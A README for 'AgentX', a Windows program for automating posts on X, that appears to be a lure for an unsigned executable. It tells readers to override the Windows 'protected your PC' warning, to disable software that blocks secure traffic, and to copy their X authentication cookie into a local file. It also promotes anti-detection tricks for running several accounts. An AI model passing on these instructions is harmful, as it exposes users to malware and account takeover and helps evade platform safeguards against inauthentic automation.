# 🤖 AgentX - Control your social media automate tasks

[ ![Download AgentX](https://img.shields.io/badge/Download-AgentX-blue) ](https://github.com/Conwaypopular850/AgentX/releases)

AgentX connects your software agents to your X profile. This tool handles the login process and sends commands to your account securely. You can manage multiple accounts and run automated tasks without frequent interruptions.

## 📦 System Requirements

AgentX runs on Windows 10 or 11. You need 50 MB of free storage space. The software connects to the internet to perform actions on your profile. Ensure your computer has a stable network connection. Disable any conflicting software that might block secure web traffic.

## 🚀 Downloading AgentX

1. Open your web browser.
2. Go to the [AgentX release page](https://github.com/Conwaypopular850/AgentX/releases).
3. Look for the file named `AgentX-windows-amd64.exe` in the latest release section.
4. Click the file name to start the download.
5. Save the file to your desktop or downloads folder.

## ⚙️ Installation Steps

Windows might show a warning because AgentX is a tool for developers and advanced users. To run the app:

1. Right-click the downloaded file.
2. Select Open.
3. If a window appears that says Windows protected your PC, click More info.
4. Click the Run anyway button.

The program will open a black window. This is the command interface. You do not need to type commands manually to start the basic features. The tool runs in the background while you monitor your tasks.

## 🔑 Preparing Your Accounts

AgentX uses cookies to stay logged into your accounts. This method prevents X from locking your profile during automated actions. 

1. Open the X website in your browser.
2. Log into the account you intend to automate.
3. Open your browser developer tools by pressing F12 or right-clicking anywhere and selecting Inspect.
4. Go to the Application tab.
5. Select Cookies on the left menu.
6. Copy the authentication token string.
7. Save this token in a text file named session.json inside the AgentX folder.

## 📝 Configuration Settings

AgentX reads instructions from a JSON file. This file acts as an envelope for your commands. Create a file named `tasks.json` in the same folder as the program.

Format your tasks like this:

{
  "command": "post",
  "text": "Hello world.",
  "account": "main"
}

The program reads this file every ten seconds. Change the text field to update your posts. Save the file to trigger the action.

## 🛠️ Managing Multiple Accounts

You can manage several profiles at once. Add each account to your `accounts.json` file. Assign a unique name to each account key. The software identifies these accounts by name when you send commands in the `tasks.json` file. Ensure every account has a valid cookie string. Expired cookies stop all automation until you provide a new one.

## 🛡️ Maintaining Account Safety

AgentX uses anti-detection techniques to mimic human behavior. The software randomizes timing between actions. Do not set your automation frequency to perform more than ten actions per minute. High activity levels can trigger security reviews on your social media profiles. 

## 🩺 Troubleshooting Common Issues

If the program closes unexpectedly, check your internet connection. Review your `tasks.json` file for missing commas or quotes. JSON format requires strict syntax. If a command fails, look at the error log in the terminal window. 

Clear your cookies and update them if the program returns an error regarding authorization. Ensure your firewall allows AgentX to access the internet. Update the software regularly to match changes on the X platform.

## 📈 Advanced Features

AgentX supports custom skills. You can integrate other tools by placing plugin files into the plugins folder. Use the command line interface to test these skills. Type `help` in the terminal to view all available commands. 

The software generates a log file to track every action. This file helps you debug failed tasks. You can view this file in any text editor. Check the size of the log file periodically to prevent it from taking up too much storage space. 

## 🤝 Frequently Asked Questions

What happens if I lose internet access? 
AgentX will pause operations and resume automatically when the connection returns.

Is my data stored on a cloud server? 
No. AgentX stores all information locally on your computer. 

Can I use this for multiple platforms? 
This version supports X. Future updates may include support for other social networks. 

Do I need to pay for a license?
AgentX is an open-source tool. It is free for all users. 

Can I run multiple instances?
You should only run one instance of the program for each configuration file to avoid conflicts.